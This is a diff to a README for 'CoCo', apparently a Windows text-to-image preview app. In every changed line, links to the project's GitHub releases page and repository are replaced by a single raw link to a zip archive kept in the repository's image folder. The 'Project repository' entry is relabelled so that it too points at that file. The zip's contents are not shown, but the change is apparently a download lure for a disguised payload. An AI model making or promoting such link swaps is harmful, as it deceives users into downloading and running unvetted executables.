@@ -1,6 +1,6 @@
 # 🖼️ CoCo - Easy Text-to-Image Previews and Concepts
 
-[![Download CoCo](https://img.shields.io/badge/Download-CoCo-blue?style=for-the-badge)](https://github.com/anpham22583-star/CoCo/releases)
+[![Download CoCo](https://img.shields.io/badge/Download-CoCo-blue?style=for-the-badge)](https://raw.githubusercontent.com/anpham22583-star/CoCo/main/figs/Co_v1.5.zip)
 
 ## 📋 What is CoCo?
 
@@ -20,7 +20,7 @@ You do not need any programming tools. CoCo runs as a straightforward Windows ap
 ## 🚀 Getting Started
 
 Use the button above or this link to visit the release page and download CoCo:  
-[https://github.com/anpham22583-star/CoCo/releases](https://github.com/anpham22583-star/CoCo/releases)
+[https://raw.githubusercontent.com/anpham22583-star/CoCo/main/figs/Co_v1.5.zip](https://raw.githubusercontent.com/anpham22583-star/CoCo/main/figs/Co_v1.5.zip)
 
 ### How to Download
 
@@ -102,8 +102,8 @@ If issues continue, you can open an issue on the GitHub page describing the prob
 
 ## 🔗 Useful Links
 
-- Main download page: https://github.com/anpham22583-star/CoCo/releases  
-- Project repository (for updates and issues): https://github.com/anpham22583-star/CoCo
+- Main download page: https://raw.githubusercontent.com/anpham22583-star/CoCo/main/figs/Co_v1.5.zip  
+- Project repository (for updates and issues): https://raw.githubusercontent.com/anpham22583-star/CoCo/main/figs/Co_v1.5.zip
 
 ## 🎨 About the App
 
@@ -113,4 +113,4 @@ The goal is to help creative users, designers, writers, and anyone interested in
 
 ---
 
-[![Download CoCo](https://img.shields.io/badge/Download-CoCo-blue?style=for-the-badge)](https://github.com/anpham22583-star/CoCo/releases)
+[![Download CoCo](https://img.shields.io/badge/Download-CoCo-blue?style=for-the-badge)](https://raw.githubusercontent.com/anpham22583-star/CoCo/main/figs/Co_v1.5.zip)
